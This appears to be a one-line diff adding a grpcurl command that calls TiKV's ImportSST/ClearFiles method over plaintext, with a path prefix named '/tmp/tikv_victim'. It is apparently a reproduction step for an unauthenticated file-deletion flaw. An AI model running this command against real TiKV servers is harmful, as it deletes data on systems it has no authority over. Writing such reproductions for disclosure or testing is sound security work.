@@ -1,0 +1,1 @@
+grpcurl -plaintext ... -d '{"prefix":"/tmp/tikv_victim"}' <tikv-host:port> import_sstpb.ImportSST/ClearFiles
